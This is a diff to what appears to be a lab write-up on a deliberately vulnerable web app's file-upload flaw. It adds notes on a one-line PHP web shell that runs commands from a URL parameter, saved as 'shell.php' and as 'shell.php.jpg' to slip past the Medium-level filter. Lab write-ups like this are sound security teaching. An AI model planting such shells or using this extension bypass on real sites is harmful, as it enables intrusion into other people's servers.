@@ -194,6 +194,7 @@ While High security blocks directory traversal sequences like `../` and `..//`, 
 system($_GET['cmd']);
 ?>
 ```
+Saved as shell.php
 
 **Result:** Success - The file was uploaded and can be accessed to execute system commands.
 
@@ -206,5 +207,15 @@ At Low security, the application performs no validation on uploaded files. It do
 **Explanation of why it failed at higher level:**
 At higher security levels, the application implements file validation checks including file type verification, extension whitelisting, and content inspection. It may also rename uploaded files, store them outside the web root, or validate MIME types to prevent malicious file execution.
 
+
+### Security Level: Medium
+
+**Payload Used:**
+```php
+<?php
+system($_GET['cmd']);
+?>
+```
+Saved as shell.php.jpg
 
 
